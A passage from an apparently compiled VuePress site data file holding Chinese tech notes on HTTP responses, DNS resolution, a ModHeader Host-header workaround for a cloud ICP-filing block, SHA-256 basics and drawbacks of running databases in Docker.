：请求资源不存在。通常是用户路径编写错误，也可能是服务器资源已删除。\n\t\t500 ：服务器内部错误。通常程序抛异常。\n\t\t\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# 响应头\n\n响应头: 用来描述服务器回给客户端浏览器的content的一些描述，例如: 我是什么服务器，我返回的是啥编码，我返回的内容有多长等等\n\n响应头也是用的键值对 key:value\n\n常见请求头                 描述\nLocation              指定响应的路径，需要与状态码302配合使用，完成跳转。\nContent-Disposition   文件下载的时候使用。通过浏览器以下载方式解析正文\nSet-Cookie            与会话相关技术。服务器向浏览器写入cookie\nRefresh               定时刷新\n\n\n# 响应体\n\n响应体，就是服务器发送给浏览器的正文。\n\n<!DOCTYPE html>\n<html >\n<head>\n    <meta charset="UTF-8">\n    <title>Title</title>\n</head>\n<body>\n    <form action="#" method="post">\n        用户名：<input type="text" name="username" value=""/> <br/>\n        密　码：<input type="text" name="password" value=""/> <br/>\n        <input type="submit"/>\n    </form>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# Http响应报文演示\n\n如下图，我们提供的响应的抓包结果（Chrome浏览器）\n\n',normalizedContent:'响应报文：从服务端到客户端的报文。\n\nhttp响应报文格式：响应行、响应头、空行、响应体 四个部分\n\n\n\n\n# 响应行\n\n例如：http/1.1 200 ok\n格式：协议/版本 状态码  状态码描述\n\t状态码：服务器与浏览器用于确定状态的固定数字号码\n\t\t200 ：请求成功。\n\t\t302 ：请求重定向。\n\t\t304 ：请求资源没有改变，访问本地缓存。\n\t\t404 ：请求资源不存在。通常是用户路径编写错误，也可能是服务器资源已删除。\n\t\t500 ：服务器内部错误。通常程序抛异常。\n\t\t\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# 响应头\n\n响应头: 用来描述服务器回给客户端浏览器的content的一些描述，例如: 我是什么服务器，我返回的是啥编码，我返回的内容有多长等等\n\n响应头也是用的键值对 key:value\n\n常见请求头                 描述\nlocation              指定响应的路径，需要与状态码302配合使用，完成跳转。\ncontent-disposition   文件下载的时候使用。通过浏览器以下载方式解析正文\nset-cookie            与会话相关技术。服务器向浏览器写入cookie\nrefresh               定时刷新\n\n\n# 响应体\n\n响应体，就是服务器发送给浏览器的正文。\n\n<!doctype html>\n<html >\n<head>\n    <meta charset="utf-8">\n    <title>title</title>\n</head>\n<body>\n    <form action="#" method="post">\n        用户名：<input type="text" name="username" value=""/> <br/>\n        密　码：<input type="text" name="password" value=""/> <br/>\n        <input type="submit"/>\n    </form>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# http响应报文演示\n\n如下图，我们提供的响应的抓包结果（chrome浏览器）\n\n',charsets:{cjk:!0},lastUpdated:"2022/04/19, 23:07:56",lastUpdatedTimestamp:1650380876e3},{title:"DNS",frontmatter:{title:"DNS",date:"2022-04-18T00:00:40.000Z",permalink:"/pages/19e439/",categories:["网络","网络原理","应用层"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/06.%E7%BD%91%E7%BB%9C/02.%E7%BD%91%E7%BB%9C%E5%8E%9F%E7%90%86/05.%E5%BA%94%E7%94%A8%E5%B1%82/06.DNS.html",relativePath:"06.网络/02.网络原理/05.应用层/06.DNS.md",key:"v-3e10c7c1",path:"/pages/19e439/",headers:[{level:2,title:"顶级域名",slug:"顶级域名",normalizedTitle:"顶级域名",charIndex:112},{level:2,title:"我国的域名划分",slug:"我国的域名划分",normalizedTitle:"我国的域名划分",charIndex:307},{level:2,title:"1. 根域名服务器",slug:"_1-根域名服务器",normalizedTitle:"1. 根域名服务器",charIndex:662},{level:2,title:"2. 顶级域名服务器",slug:"_2-顶级域名服务器",normalizedTitle:"2. 顶级域名服务器",charIndex:873},{level:2,title:"3. 权限域名服务器",slug:"_3-权限域名服务器",normalizedTitle:"3. 权限域名服务器",charIndex:920},{level:2,title:"4. 本地域名服务器",slug:"_4-本地域名服务器",normalizedTitle:"4. 本地域名服务器",charIndex:1009},{level:2,title:"递归查询",slug:"递归查询",normalizedTitle:"递归查询",charIndex:1141},{level:2,title:"迭代查询",slug:"迭代查询",normalizedTitle:"迭代查询",charIndex:1186},{level:2,title:"高速缓存",slug:"高速缓存",normalizedTitle:"高速缓存",charIndex:1234}],headersStr:"顶级域名 我国的域名划分 1. 根域名服务器 2. 顶级域名服务器 3. 权限域名服务器 4. 本地域名服务器 递归查询 迭代查询 高速缓存",content:"# 互联网的域名结构\n\n互联网采用了层次树状结构的命名方法。 任何一个连接在互联网上的主机或路由器，都有一个唯一的层次结构的名字，即域名。 域名的结构由标号序列组成，各标号之间用点隔开\n\n… . 三级域名 . 二级域名 . 顶级域名\n\n\n1\n\n\n\n# 顶级域名\n\n 1. 国家顶级域名 如: cn 表示中国， us 表示美国， uk 表示英国等。\n 2. 通用顶级域名 如： com（公司和企业）， net（网络服务机构），org（非赢利性组织）， edu（美国专用的教育机构），gov（美国专用的政府部门）， int（国际组织）等\n 3. 基础结构域名 arpa，用于反向域名解析，因此又称为反向域名。\n\n\n# 我国的域名划分\n\n我国把二级域名划分为类别域名和行政区域名两类。\n\n 1. 类别域名共7个： com（工、商、金融等企业）， net（提供互连网络服务的机构），org（非赢利性组织）， edu（教育机构）， gov（中国的政府机构），mil(中国的国防机构）， ac（科研机构）\n\n 2. 行政区域名共34个，适用于我国的各省、自治区、直辖市。如北京 bj，河南 ha 等。\n    \n    \n    \n    图中圈出的两个mail之间没有任何关系\n\n\n# 域名服务器\n\n域名系统DNS使用域名服务器实现域名到IP地址的解析。\n\n一个服务器所负责管辖的（或有权限的）范围叫做区。\n\n每一个区设置相应的权限域名服务器，用来保存该区中的所有主机的域名到 IP 地址的映射。\n\n域名服务器有以下四种类型\n\n\n# 1. 根域名服务器\n\n根域名服务器是最高层次的域名服务器，也是最重要的域名服务器。所有的根域名服务器都知道所有的顶级域名服务器的域名和 IP 地址。\n\n不管是哪一个本地域名服务器，若要对互联网上任何一个域名进行解析，只要自己无法解析，就首先求助于根域名服务器。\n\n在互联网上共有 13 个不同 IP 地址的根域名服务器，它们的名字是用一个英文字母命名，从 a 一直到 m 。\n\n> 这些域名服务器有很多镜像服务器\n\n\n# 2. 顶级域名服务器\n\n顶级域名服务器负责管理在该顶级域名服务器注册的所有二级域名。\n\n\n# 3. 权限域名服务器\n\n负责一个区的域名服务器。 当一个权限域名服务器还不能给出最后的查询回答时，就会告诉发出查询请求的 DNS 客户，下一步应当找哪一个权限域名服务器\n\n\n# 4. 本地域名服务器\n\n当一个主机发出 DNS 查询请求时，这个查询请求报文就发送给本地域名服务器。\n\n每一个互联网服务提供者 ISP，或一个大学，甚至一个大学里的系，都可以拥有一个本地域名服务器，这种域名服务器有时也称为默认域名服务器\n\n\n# 域名解析\n\n\n# 递归查询\n\n主机向本地域名服务器的查询一般都是采用递归查询 DNS解析：递归查询\n\n\n# 迭代查询\n\n本地域名服务器向根域名服务器的查询通常是采用迭代查询 DNS解析：迭代查询\n\n\n# 高速缓存\n\n每个域名服务器都维护一个高速缓存，存放最近用过的名字以及从何处获得名字映射信息的记录。\n\n可大大减轻根域名服务器的负荷，使互联网上的 DNS 查询请求和回答报文的数量大为减少。\n\n为保持高速缓存中的内容正确，域名服务器应为每项内容设置计时器，并处理超过合理时间的项（例如，每个项目只存放两天）",normalizedContent:"# 互联网的域名结构\n\n互联网采用了层次树状结构的命名方法。 任何一个连接在互联网上的主机或路由器，都有一个唯一的层次结构的名字，即域名。 域名的结构由标号序列组成，各标号之间用点隔开\n\n… . 三级域名 . 二级域名 . 顶级域名\n\n\n1\n\n\n\n# 顶级域名\n\n 1. 国家顶级域名 如: cn 表示中国， us 表示美国， uk 表示英国等。\n 2. 通用顶级域名 如： com（公司和企业）， net（网络服务机构），org（非赢利性组织）， edu（美国专用的教育机构），gov（美国专用的政府部门）， int（国际组织）等\n 3. 基础结构域名 arpa，用于反向域名解析，因此又称为反向域名。\n\n\n# 我国的域名划分\n\n我国把二级域名划分为类别域名和行政区域名两类。\n\n 1. 类别域名共7个： com（工、商、金融等企业）， net（提供互连网络服务的机构），org（非赢利性组织）， edu（教育机构）， gov（中国的政府机构），mil(中国的国防机构）， ac（科研机构）\n\n 2. 行政区域名共34个，适用于我国的各省、自治区、直辖市。如北京 bj，河南 ha 等。\n    \n    \n    \n    图中圈出的两个mail之间没有任何关系\n\n\n# 域名服务器\n\n域名系统dns使用域名服务器实现域名到ip地址的解析。\n\n一个服务器所负责管辖的（或有权限的）范围叫做区。\n\n每一个区设置相应的权限域名服务器，用来保存该区中的所有主机的域名到 ip 地址的映射。\n\n域名服务器有以下四种类型\n\n\n# 1. 根域名服务器\n\n根域名服务器是最高层次的域名服务器，也是最重要的域名服务器。所有的根域名服务器都知道所有的顶级域名服务器的域名和 ip 地址。\n\n不管是哪一个本地域名服务器，若要对互联网上任何一个域名进行解析，只要自己无法解析，就首先求助于根域名服务器。\n\n在互联网上共有 13 个不同 ip 地址的根域名服务器，它们的名字是用一个英文字母命名，从 a 一直到 m 。\n\n> 这些域名服务器有很多镜像服务器\n\n\n# 2. 顶级域名服务器\n\n顶级域名服务器负责管理在该顶级域名服务器注册的所有二级域名。\n\n\n# 3. 权限域名服务器\n\n负责一个区的域名服务器。 当一个权限域名服务器还不能给出最后的查询回答时，就会告诉发出查询请求的 dns 客户，下一步应当找哪一个权限域名服务器\n\n\n# 4. 本地域名服务器\n\n当一个主机发出 dns 查询请求时，这个查询请求报文就发送给本地域名服务器。\n\n每一个互联网服务提供者 isp，或一个大学，甚至一个大学里的系，都可以拥有一个本地域名服务器，这种域名服务器有时也称为默认域名服务器\n\n\n# 域名解析\n\n\n# 递归查询\n\n主机向本地域名服务器的查询一般都是采用递归查询 dns解析：递归查询\n\n\n# 迭代查询\n\n本地域名服务器向根域名服务器的查询通常是采用迭代查询 dns解析：迭代查询\n\n\n# 高速缓存\n\n每个域名服务器都维护一个高速缓存，存放最近用过的名字以及从何处获得名字映射信息的记录。\n\n可大大减轻根域名服务器的负荷，使互联网上的 dns 查询请求和回答报文的数量大为减少。\n\n为保持高速缓存中的内容正确，域名服务器应为每项内容设置计时器，并处理超过合理时间的项（例如，每个项目只存放两天）",charsets:{cjk:!0},lastUpdated:"2022/04/19, 23:07:56",lastUpdatedTimestamp:1650380876e3},{title:"DNS解析：递归查询",frontmatter:{title:"DNS解析：递归查询",date:"2022-04-18T00:00:40.000Z",permalink:"/pages/fd2dd6/",categories:["网络","网络原理","应用层"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/06.%E7%BD%91%E7%BB%9C/02.%E7%BD%91%E7%BB%9C%E5%8E%9F%E7%90%86/05.%E5%BA%94%E7%94%A8%E5%B1%82/07.DNS%E8%A7%A3%E6%9E%90%EF%BC%9A%E9%80%92%E5%BD%92%E6%9F%A5%E8%AF%A2.html",relativePath:"06.网络/02.网络原理/05.应用层/07.DNS解析：递归查询.md",key:"v-19f9df50",path:"/pages/fd2dd6/",headersStr:null,content:"如果主机所询问的本地域名服务器不知道被查询域名的 IP 地址，那么本地域名服务器就以 DNS 客户的身份，向其他根域名服务器继续发出查询请求报文。\n\n",normalizedContent:"如果主机所询问的本地域名服务器不知道被查询域名的 ip 地址，那么本地域名服务器就以 dns 客户的身份，向其他根域名服务器继续发出查询请求报文。\n\n",charsets:{cjk:!0},lastUpdated:"2022/04/19, 23:07:56",lastUpdatedTimestamp:1650380876e3},{title:"DNS解析：迭代查询",frontmatter:{title:"DNS解析：迭代查询",date:"2022-04-18T00:00:40.000Z",permalink:"/pages/c8836d/",categories:["网络","网络原理","应用层"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/06.%E7%BD%91%E7%BB%9C/02.%E7%BD%91%E7%BB%9C%E5%8E%9F%E7%90%86/05.%E5%BA%94%E7%94%A8%E5%B1%82/08.DNS%E8%A7%A3%E6%9E%90%EF%BC%9A%E8%BF%AD%E4%BB%A3%E6%9F%A5%E8%AF%A2.html",relativePath:"06.网络/02.网络原理/05.应用层/08.DNS解析：迭代查询.md",key:"v-255332ff",path:"/pages/c8836d/",headersStr:null,content:"当根域名服务器收到本地域名服务器的迭代查询请求报文时，要么给出所要查询的 IP 地址，要么告诉本地域名服务器：“你下一步应当向哪一个域名服务器进行查询”。然后让本地域名服务器进行后续的查询。\n\n",normalizedContent:"当根域名服务器收到本地域名服务器的迭代查询请求报文时，要么给出所要查询的 ip 地址，要么告诉本地域名服务器：“你下一步应当向哪一个域名服务器进行查询”。然后让本地域名服务器进行后续的查询。\n\n",charsets:{cjk:!0},lastUpdated:"2022/04/19, 23:07:56",lastUpdatedTimestamp:1650380876e3},{title:"本地Host文件解析域名后访问云服务器, 结果请求被拦截, 提示备案问题的解决方式",frontmatter:{title:"本地Host文件解析域名后访问云服务器, 结果请求被拦截, 提示备案问题的解决方式",date:"2022-04-18T00:00:40.000Z",permalink:"/pages/dc49cf/",categories:["网络"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/06.%E7%BD%91%E7%BB%9C/03.%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/01.%E6%9C%AC%E5%9C%B0Host%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E5%9F%9F%E5%90%8D%E5%90%8E%E8%AE%BF%E9%97%AE%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8,%20%E7%BB%93%E6%9E%9C%E8%AF%B7%E6%B1%82%E8%A2%AB%E6%8B%A6%E6%88%AA,%20%E6%8F%90%E7%A4%BA%E5%A4%87%E6%A1%88%E9%97%AE%E9%A2%98%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E5%BC%8F.html",relativePath:"06.网络/03.问题解决/01.本地Host文件解析域名后访问云服务器, 结果请求被拦截, 提示备案问题的解决方式.md",key:"v-6ab2241f",path:"/pages/dc49cf/",headers:[{level:2,title:"两种配置方法",slug:"两种配置方法",normalizedTitle:"两种配置方法",charIndex:1056}],headersStr:"两种配置方法",content:"# 起因\n\n在改完host文件配置之后, 经过了mysql, docker, redis, jdk, nginx等各种安装配置之后, nginx代理80端口, 浏览器访问sinjar.cn也成功打开页面. 但是第二天再次访问的时候, 发现居然提示我域名要备案.\n\n\n\n我擦嘞, 我本地的host文件里的域名备什么案! 只是做本地ip解析用的!\n\n\n# 查找原因\n\n在网上查找了原因之后, 发现是访问阿里云服务器的时候, 阿里云服务器的网关会对非授权的访问进行截获。\n\n如果你没有备案，那么针对特定端口，比如80，443的请求进行截获。当你备案后就予以放行。\n\n\n\n也就是说, 如果没有备案的话, 使用本地域名访问80，443端口的话是会被拦截的, 但是访问其它端口却问题(例如使用域名访问22, 3306, 6379等端口就可以正常访问), 而且如果使用ip地址的话, 也是可以正常访问的.\n\n\n\n\n# 明明是通过本地host文件解析域名为ip地址, 为神马服务器还是知道我访问的域名呢\n\n其实从第一开始我输入本地域名, 跳出提示需要备案页面的时候, 我就有这个问题, 我一直以为的是, 本地host文件里面有对应域名的话, 访问的IP地址会被替换成host文件里面对应的ip地址, 而服务器是获取不了你访问的域名的.\n\n但事实是, 访问80端口, 通过域名访问, 网关获取了你的域名, 并查出你的域名没有备案, 那么说明请求报文肯定带上了 sinjar.cn 这个域名.\n\n那么就用Wireshark抓包分析一下(在我电脑里面吃土一年的Wireshark终于再次有了用武之地).\n\n使用IP地址访问, 抓到的请求数据如下.\n\n\n\n使用sinjar.cn访问, 抓到的请求数据如下.\n\n\n\n经过抓包测试后才发现, 使用浏览器通过域名访问服务器, 域名确实通过host文件被替换成了ip地址, 但是请求报文的头也还带有你的本地域名(请求头的Host属性).\n\n想来阿里云服务器就是通过Hypertext Transder Protocol中的Host来判断出你使用的这个域名没有经过备案.\n\n\n# 最终解决方式\n\n插件名： ModHeader\n\n既然是请求头携带了域名, 那就容易了, 要知道请求头是由浏览器进行封装的, 而万能强大的chrome浏览器修改个host简直太容易了有没有.\n\nModHeader, 号称能够修改请求和相应的各种数据\n\n我马上安装了这个插件, 并根据操作很快找到了两种解决方式\n\n\n# 两种配置方法\n\n第一种配置\n\n> 使用redirect URLs功能映射地址, 这样的话, 当你输入域名的时候, 浏览器会自动将域名转换为IP地址, 但是这样的话浏览器URL栏里面的sinjar.cn, 会变成ip 118.xxx.xx.xxx, 感觉用着也不太优雅.\n\n第二种配置(我当前在使用的配置)\n\n> 当浏览器访问域名 sinjar.cn 的时候, 浏览器会自动把报文头里面的 Host 属性改为ip地址, 这样的话浏览器Url栏里面显示的依然是sinjar.cn. 此时使用 Wireshark 抓包发现Host属性的值也变成了ip地址, 完美解决了我的需求",normalizedContent:"# 起因\n\n在改完host文件配置之后, 经过了mysql, docker, redis, jdk, nginx等各种安装配置之后, nginx代理80端口, 浏览器访问sinjar.cn也成功打开页面. 但是第二天再次访问的时候, 发现居然提示我域名要备案.\n\n\n\n我擦嘞, 我本地的host文件里的域名备什么案! 只是做本地ip解析用的!\n\n\n# 查找原因\n\n在网上查找了原因之后, 发现是访问阿里云服务器的时候, 阿里云服务器的网关会对非授权的访问进行截获。\n\n如果你没有备案，那么针对特定端口，比如80，443的请求进行截获。当你备案后就予以放行。\n\n\n\n也就是说, 如果没有备案的话, 使用本地域名访问80，443端口的话是会被拦截的, 但是访问其它端口却问题(例如使用域名访问22, 3306, 6379等端口就可以正常访问), 而且如果使用ip地址的话, 也是可以正常访问的.\n\n\n\n\n# 明明是通过本地host文件解析域名为ip地址, 为神马服务器还是知道我访问的域名呢\n\n其实从第一开始我输入本地域名, 跳出提示需要备案页面的时候, 我就有这个问题, 我一直以为的是, 本地host文件里面有对应域名的话, 访问的ip地址会被替换成host文件里面对应的ip地址, 而服务器是获取不了你访问的域名的.\n\n但事实是, 访问80端口, 通过域名访问, 网关获取了你的域名, 并查出你的域名没有备案, 那么说明请求报文肯定带上了 sinjar.cn 这个域名.\n\n那么就用wireshark抓包分析一下(在我电脑里面吃土一年的wireshark终于再次有了用武之地).\n\n使用ip地址访问, 抓到的请求数据如下.\n\n\n\n使用sinjar.cn访问, 抓到的请求数据如下.\n\n\n\n经过抓包测试后才发现, 使用浏览器通过域名访问服务器, 域名确实通过host文件被替换成了ip地址, 但是请求报文的头也还带有你的本地域名(请求头的host属性).\n\n想来阿里云服务器就是通过hypertext transder protocol中的host来判断出你使用的这个域名没有经过备案.\n\n\n# 最终解决方式\n\n插件名： modheader\n\n既然是请求头携带了域名, 那就容易了, 要知道请求头是由浏览器进行封装的, 而万能强大的chrome浏览器修改个host简直太容易了有没有.\n\nmodheader, 号称能够修改请求和相应的各种数据\n\n我马上安装了这个插件, 并根据操作很快找到了两种解决方式\n\n\n# 两种配置方法\n\n第一种配置\n\n> 使用redirect urls功能映射地址, 这样的话, 当你输入域名的时候, 浏览器会自动将域名转换为ip地址, 但是这样的话浏览器url栏里面的sinjar.cn, 会变成ip 118.xxx.xx.xxx, 感觉用着也不太优雅.\n\n第二种配置(我当前在使用的配置)\n\n> 当浏览器访问域名 sinjar.cn 的时候, 浏览器会自动把报文头里面的 host 属性改为ip地址, 这样的话浏览器url栏里面显示的依然是sinjar.cn. 此时使用 wireshark 抓包发现host属性的值也变成了ip地址, 完美解决了我的需求",charsets:{cjk:!0},lastUpdated:"2022/04/19, 23:07:56",lastUpdatedTimestamp:1650380876e3},{title:"目录",frontmatter:{pageComponent:{name:"Catalogue",data:{path:"06.网络",imgUrl:"/img/catalog.png",description:"网络"}},title:"目录",date:"2022-04-17T21:48:12.000Z",permalink:"/network/",sidebar:!0,article:!1,comment:!1,editLink:!1,author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/06.%E7%BD%91%E7%BB%9C/catalog.html",relativePath:"06.网络/catalog.md",key:"v-c2370fc8",path:"/network/",headersStr:null,content:"",normalizedContent:"",charsets:{},lastUpdated:"2022/04/19, 23:07:56",lastUpdatedTimestamp:1650380876e3},{title:"SHA256算法",frontmatter:{title:"SHA256算法",date:"2022-04-17T23:56:56.000Z",permalink:"/pages/b72d37/",categories:["密码学"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/07.%E5%AF%86%E7%A0%81%E5%AD%A6/01.SHA256%E7%AE%97%E6%B3%95.html",relativePath:"07.密码学/01.SHA256算法.md",key:"v-06f10128",path:"/pages/b72d37/",headersStr:null,content:"# SHA-2 族算法简介\n\n一个n位的哈希函数就是一个从任意长的消息到n位哈希值的映射，一个n位的加密哈希函数就是一个单向的、避免碰撞的n位哈希函数。这样的函数是目前在数字签名和密码保护当中极为重要的手段。\n\n当前比较流行的哈希函数主要有128位的MD4和MD5和160位的SHA-1，SHA-2族有着更多位的输出哈希值，破解难度更大，能够提高更高的安全性。\n\nSHA-2，名称来自于安全散列算法2（英语：Secure Hash Algorithm 2）的缩写，一种密码散列函数算法标准，由美国国家安全局研发，由美国国家标准与技术研究院（NIST）在2001年发布。属于SHA算法之一，是SHA-1的后继者。其下又可再分为六个不同的算法标准，包括了：SHA-224、SHA-256、SHA-384、SHA-512、SHA-512/224、SHA-512/256。\n\n这些变体除了生成摘要的长度、循环运行的次数等一些细微差异之外，基本结构是一致的。\n\n\n# 概述\n\n对于任意长度的消息，SHA256都会产生一个256位的哈希值，称作消息摘要。这个摘要相当于是个长度为32个字节的数组，通常有一个长度为64的十六进制字符串来表示，其中1个字节=8位，一个十六进制的字符的长度为4位。",normalizedContent:"# sha-2 族算法简介\n\n一个n位的哈希函数就是一个从任意长的消息到n位哈希值的映射，一个n位的加密哈希函数就是一个单向的、避免碰撞的n位哈希函数。这样的函数是目前在数字签名和密码保护当中极为重要的手段。\n\n当前比较流行的哈希函数主要有128位的md4和md5和160位的sha-1，sha-2族有着更多位的输出哈希值，破解难度更大，能够提高更高的安全性。\n\nsha-2，名称来自于安全散列算法2（英语：secure hash algorithm 2）的缩写，一种密码散列函数算法标准，由美国国家安全局研发，由美国国家标准与技术研究院（nist）在2001年发布。属于sha算法之一，是sha-1的后继者。其下又可再分为六个不同的算法标准，包括了：sha-224、sha-256、sha-384、sha-512、sha-512/224、sha-512/256。\n\n这些变体除了生成摘要的长度、循环运行的次数等一些细微差异之外，基本结构是一致的。\n\n\n# 概述\n\n对于任意长度的消息，sha256都会产生一个256位的哈希值，称作消息摘要。这个摘要相当于是个长度为32个字节的数组，通常有一个长度为64的十六进制字符串来表示，其中1个字节=8位，一个十六进制的字符的长度为4位。",charsets:{cjk:!0},lastUpdated:"2022/04/20, 02:00:34",lastUpdatedTimestamp:1650391234e3},{title:"密码学",frontmatter:{pageComponent:{name:"Catalogue",data:{path:"07.密码学",imgUrl:"/img/catalog.png",description:"密码学"}},title:"密码学",date:"2022-04-17T21:48:12.000Z",permalink:"/cryptography/",sidebar:!0,article:!1,comment:!1,editLink:!1,author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/07.%E5%AF%86%E7%A0%81%E5%AD%A6/catalog.html",relativePath:"07.密码学/catalog.md",key:"v-4c866dac",path:"/cryptography/",headersStr:null,content:"",normalizedContent:"",charsets:{},lastUpdated:"2022/04/20, 02:00:34",lastUpdatedTimestamp:1650391234e3},{title:"不建议docker部署数据库",frontmatter:{title:"不建议docker部署数据库",date:"2022-04-18T00:00:13.000Z",permalink:"/pages/7ab8e7/",categories:["软件使用","docker"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/01.docker/01.%E4%B8%8D%E5%BB%BA%E8%AE%AEdocker%E9%83%A8%E7%BD%B2%E6%95%B0%E6%8D%AE%E5%BA%93.html",relativePath:"08.软件使用/01.docker/01.不建议docker部署数据库.md",key:"v-72806129",path:"/pages/7ab8e7/",headersStr:null,content:"# Docker不适合部署数据库的7大原因\n\n1、数据安全问题不要将数据储存在容器中，这也是 Docker 官方容器使用技巧中的一条。容器随时可以停止、或者删除。当容器被rm掉，容器里的数据将会丢失。为了避免数据丢失，用户可以使用数据卷挂载来存储数据。但是容器的 Volumes 设计是围绕 Union FS 镜像层提供持久存储，数据安全缺乏保证。如果容器突然崩溃，数据库未正常关闭，可能会损坏数据。另外，容器里共享数据卷组，对物理机硬件损伤也比较大。即使你要把 Docker 数据放在主机来存储 ，它依然不能保证不丢数据。使用当前的存储驱动程序，Docker 仍然存在不可靠的风险。如果容器崩溃并数据库未正确关闭，则可能会损坏数据。\n\n2、性能问题大家都知道，MySQL 属于关系型数据库，对IO要求较高。当一台物理机跑多个时，IO就会累加，导致IO瓶颈，大大降低 MySQL 的读写性能。在一次Docker应用的十大难点专场上，某国有银行的一位架构师也曾提出过：“数据库的性能瓶颈一般出现在IO上面，如果按 Docker 的思路，那么多个docker最终IO请求又会出现在存储上面。现在互联网的数据库多是share nothing的架构，可能这也是不考虑迁移到 Docker 的一个因素吧”。\n\n> 针对性能问题有些同学可能也有相对应的方案来解决：\n> \n> (1)数据库程序与数据分离\n> \n> 如果使用Docker 跑 MySQL，数据库程序与数据需要进行分离，将数据存放到共享存储，程序放到容器里。如果容器有异常或 MySQL 服务异常，自动启动一个全新的容器。另外，建议不要把数据存放到宿主机里，宿主机和容器共享卷组，对宿主机损坏的影响比较大。\n> \n> (2)跑轻量级或分布式数据库\n> \n> Docker 里部署轻量级或分布式数据库，Docker 本身就推荐服务挂掉，自动启动新容器，而不是继续重启容器服务。\n> \n> (3)合理布局应用\n> \n> 对于IO要求比较高的应用或者服务，将数据库部署在物理机或者KVM中比较合适。目前TX云的TDSQL和阿里的Oceanbase都是直接部署在物理机器，而非Docker 。\n\n3、网络问题要理解 Docker 网络，您必须对网络虚拟化有深入的了解。数据库需要专用的和持久的吞吐量，以实现更高的负载。未解决的 Docker 网络问题在1.9版本依然没有得到解决。把这些问题放在一起，容器化使数据库容器很难管理。你需要花多少时间解决 Docker 网络问题？将数据库放在专用环境不会更好吗？节省时间来专注于真正重要的业务目标。\n\n4、状态在 Docker 中打包无状态服务是很酷的，可以实现编排容器并解决单点故障问题。但是数据库呢？将数据库放在同一个环境中，它将会是有状态的，并使系统故障的范围更大。下次您的应用程序实例或应用程序崩溃，可能会影响数据库。知识点:在 Docker 中水平伸缩只能用于无状态计算服务，而不是数据库。Docker 快速扩展的一个重要特征就是无状态，具有数据状态的都不适合直接放在 Docker 里面，如果 Docker 中安装数据库，存储服务需要单独提供。目前，TX云的TDSQL(金融分布式数据库)和阿里云的Oceanbase(分布式数据库系统)都直接运行中在物理机器上，并非使用便于管理的 Docker 上。\n\n5、资源隔离资源隔离方面，Docker 确实不如虚拟机KVM，Docker是利用Cgroup实现资源限制的，只能限制资源消耗的最大值，而不能隔绝其他程序占用自己的资源。如果其他应用过渡占用物理机资源，将会影响容器里 MySQL 的读写效率。需要的隔离级别越多，获得的资源开销就越多。相比专用环境而言，容易水平伸缩是Docker的一大优势。然而在 Docker 中水平伸缩只能用于无状态计算服务，数据库并不适用。我们没有看到任何针对数据库的隔离功能，那为什么我们应该把它放在容器中呢？\n\n6、云平台的不适用性大部分人通过共有云开始项目。云简化了虚拟机操作和替换的复杂性，因此不需要在夜间或周末没有人工作时间来测试新的硬件环境。当我们可以迅速启动一个实例的时候，为什么我们需要担心这个实例运行的环境？这就是为什么我们向云提供商支付很多费用的原因。当我们为实例放置数据库容器时，上面说的这些便利性就不存在了。因为数据不一致，新实例不会与老实例兼容，如果要限制实例使用单机服务，应该让 DB 使用非容器化环境，我们仅仅需要为计算服务层保留弹性扩展的能力。\n\n7、运行数据库的环境需求常看到 DBMS 容器和其他服务运行在同一主机上。然而这些服务对硬件要求是非常不同的。数据库（特别是关系型数据库）对 IO 的要求较高。一般数据库引擎为了避免并发资源竞争而使用专用环境。如果将你的数据库放在容器中，那么将浪费你的项目的资源。因为你需要为该实例配置大量额外的资源。在公有云，当你需要 34G 内存时，你启动的实例却必须开 64G 内存。在实践中，这些资源并未完全使用。怎么解决？您可以分层设计，并使用固定资源来启动不同层次的多个实例。水平伸缩总是比垂直伸缩更好。\n\n\n# 总结\n\n针对上面问题是不是说数据库一定不要部署在容器里吗？\n\n答案是：并不是我们可以把数据丢失不敏感的业务（搜索、埋点）就可以容器化，利用数据库分片来来增加实例数，从而增加吞吐量。docker适合跑轻量级或分布式数据库，当docker服务挂掉，会自动启动新容器，而不是继续重启容器服务。数据库利用中间件和容器化系统能够自动伸缩、容灾、切换、自带多个节点，也是可以进行容器化的。",normalizedContent:"# docker不适合部署数据库的7大原因\n\n1、数据安全问题不要将数据储存在容器中，这也是 docker 官方容器使用技巧中的一条。容器随时可以停止、或者删除。当容器被rm掉，容器里的数据将会丢失。为了避免数据丢失，用户可以使用数据卷挂载来存储数据。但是容器的 volumes 设计是围绕 union fs 镜像层提供持久存储，数据安全缺乏保证。如果容器突然崩溃，数据库未正常关闭，可能会损坏数据。另外，容器里共享数据卷组，对物理机硬件损伤也比较大。即使你要把 docker 数据放在主机来存储 ，它依然不能保证不丢数据。使用当前的存储驱动程序，docker 仍然存在不可靠的风险。如果容器崩溃并数据库未正确关闭，则可能会损坏数据。\n\n2、性能问题大家都知道，mysql 属于关系型数据库，对io要求较高。当一台物理机跑多个时，io就会累加，导致io瓶颈，大大降低 mysql 的读写性能。在一次docker应用的十大难点专场上，某国有银行的一位架构师也曾提出过：“数据库的性能瓶颈一般出现在io上面，如果按 docker 的思路，那么多个docker最终io请求又会出现在存储上面。现在互联网的数据库多是share nothing的架构，可能这也是不考虑迁移到 docker 的一个因素吧”。\n\n> 针对性能问题有些同学可能也有相对应的方案来解决：\n> \n> (1)数据库程序与数据分离\n> \n> 如果使用docker 跑 